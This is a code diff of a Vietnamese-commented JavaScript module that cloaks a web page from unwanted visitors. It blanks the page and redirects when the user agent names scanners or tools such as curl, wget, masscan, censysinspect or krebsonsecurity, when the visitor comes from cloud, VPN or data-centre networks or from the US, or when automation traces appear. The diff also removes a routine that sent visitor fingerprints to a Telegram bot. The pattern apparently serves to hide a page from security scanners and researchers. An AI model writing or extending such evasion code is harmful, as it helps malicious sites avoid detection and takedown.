@@ -1,78 +1,72 @@
-import config from '@/utils/config';
-import axios from 'axios';
-
 const blockedKeywords = ['bot', 'crawler', 'spider', 'puppeteer', 'selenium', 'http', 'client', 'curl', 'wget', 'python', 'java', 'ruby', 'go', 'scrapy', 'lighthouse', 'censysinspect', 'krebsonsecurity', 'ivre-masscan', 'ahrefs', 'semrush', 'sistrix', 'mailchimp', 'mailgun', 'larbin', 'libwww', 'spinn3r', 'zgrab', 'masscan', 'yandex', 'baidu', 'sogou', 'tweetmeme', 'misting', 'BotPoke'];
 
-const blockedASNs = [15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049];
+const blockedASNs = [
+    // Google Cloud / Google LLC
+    15169,
+    32934,
+    396982,
+    // Microsoft Azure
+    8075,
+    // Amazon AWS
+    16509,
+    16510,
+    14618,
+    // Oracle Corporation
+    31898,
+    // Alibaba Cloud
+    45102,
+    // Beijing Guanghuan Xinwang Digital
+    55960,
+    // Data Centers
+    198605,
+    201814,
+    24940,
+    51396,
+    14061,
+    20473,
+    63949,
+    16276,
+    135377,
+    52925,
+    17895,
+    52468,
+    36947,
+    // VPN Providers
+    212238,
+    60068,
+    136787,
+    62240,
+    9009,
+    208172,
+    131199,
+    21859,
+    // Proxy / Hosting
+    55720,
+    397373,
+    208312,
+    37100,
+    // Other
+    214961,
+    401115,
+    210644,
+    6939,
+    209,
+    147049,
+    63023,
+];
 
-const blockedIPs = ['95.214.55.43', '154.213.184.3'];
-
-const sendBotTelegram = async (reason) => {
-    try {
-        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-        const botToken = config.noti_token;
-        const chatId = config.noti_chat_id;
-
-        const geoRes = await axios.get(geoUrl);
-        const geoData = geoRes.data;
-        const fullFingerprint = {
-            asn: geoData.asn,
-            organization_name: geoData.organization_name,
-            organization: geoData.organization,
-            ip: geoData.ip,
-            navigator: {
-                userAgent: navigator.userAgent,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                maxTouchPoints: navigator.maxTouchPoints,
-                webdriver: navigator.webdriver
-            },
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight
-            }
-        };
-
-        const msg = `🚫 <b>BOT BỊ CHẶN</b>
-🔍 <b>Lý do:</b> <code>${reason}</code>
-
-📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
-🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
-🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>
-
-🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
-💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
-📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
-🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>
-
-📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
-📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
-
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const payload = {
-            chat_id: chatId,
-            text: msg,
-            parse_mode: 'HTML'
-        };
-
-        await axios.post(telegramUrl, payload, {
-            headers: { 'Content-Type': 'application/json' }
-        });
-    } catch {
-    }
-};
+const blockedIPs = ['95.214.55.43', '154.213.184.3', '38.68.134.126'];
 
 const checkAndBlockBots = async () => {
     const userAgent = navigator.userAgent.toLowerCase();
     const blockedKeyword = blockedKeywords.find((keyword) => userAgent.includes(keyword));
     if (blockedKeyword) {
         const reason = `user agent chứa keyword: ${blockedKeyword}`;
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         try {
             window.location.href = 'about:blank';
         } catch {
+            // Một số môi trường chặn điều hướng; đã xóa DOM phía trên.
         }
         return { isBlocked: true, reason };
     }
@@ -88,9 +82,16 @@ const checkAndBlockByGeoIP = async () => {
 
         const data = JSON.parse(ipInfo);
 
+        const countryCode = String(data.country_code || '').toUpperCase();
+        if (countryCode === 'US') {
+            const reason = 'GeoIP: quốc gia US';
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+            return { isBlocked: true, reason };
+        }
+
         if (blockedASNs.includes(Number(data.asn))) {
             const reason = `ASN bị chặn: ${data.asn}`;
-            await sendBotTelegram(reason);
             document.body.innerHTML = '';
             window.location.href = 'about:blank';
             return { isBlocked: true, reason };
@@ -98,7 +99,6 @@ const checkAndBlockByGeoIP = async () => {
 
         if (blockedIPs.includes(data.ip)) {
             const reason = `IP bị chặn: ${data.ip}`;
-            await sendBotTelegram(reason);
             document.body.innerHTML = '';
             window.location.href = 'about:blank';
             return { isBlocked: true, reason };
@@ -113,7 +113,6 @@ const checkAndBlockByGeoIP = async () => {
 const checkAdvancedWebDriverDetection = async () => {
     if (navigator.webdriver === true) {
         const reason = 'navigator.webdriver = true';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
@@ -121,34 +120,29 @@ const checkAdvancedWebDriverDetection = async () => {
 
     if ('__nightmare' in window) {
         const reason = 'nightmare detected';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
     }
     if ('_phantom' in window || 'callPhantom' in window) {
         const reason = 'phantom detected';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
     }
     if ('Buffer' in window) {
         const reason = 'buffer detected';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
     }
     if ('emit' in window) {
         const reason = 'emit detected';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
     if ('spawn' in window) {
         const reason = 'spawn detected';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
@@ -158,26 +152,22 @@ const checkAdvancedWebDriverDetection = async () => {
     const foundProp = seleniumProps.find((prop) => prop in window);
     if (foundProp) {
         const reason = `selenium property: ${foundProp}`;
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
 
     if ('__webdriver_evaluate' in document) {
         const reason = 'webdriver_evaluate in document';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
     if ('__selenium_evaluate' in document) {
         const reason = 'selenium_evaluate in document';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
     if ('__webdriver_script_function' in document) {
         const reason = 'webdriver_script_function in document';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
@@ -188,21 +178,18 @@ const checkAdvancedWebDriverDetection = async () => {
 const checkNavigatorAnomalies = async () => {
     if (navigator.webdriver === true) {
         const reason = 'navigator.webdriver = true';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
 
     if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
         const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
     }
     if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
         const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         return { isBot: true, reason };
     }
@@ -213,7 +200,6 @@ const checkNavigatorAnomalies = async () => {
 const checkScreenAnomalies = async () => {
     if (screen.width === 2000 && screen.height === 2000) {
         const reason = 'màn hình 2000x2000 (bot pattern)';
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
@@ -221,14 +207,12 @@ const checkScreenAnomalies = async () => {
 
     if (screen.width > 4000 || screen.height > 4000) {
         const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
     }
     if (screen.width < 200 || screen.height < 200) {
         const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
-        await sendBotTelegram(reason);
         document.body.innerHTML = '';
         window.location.href = 'about:blank';
         return { isBot: true, reason };
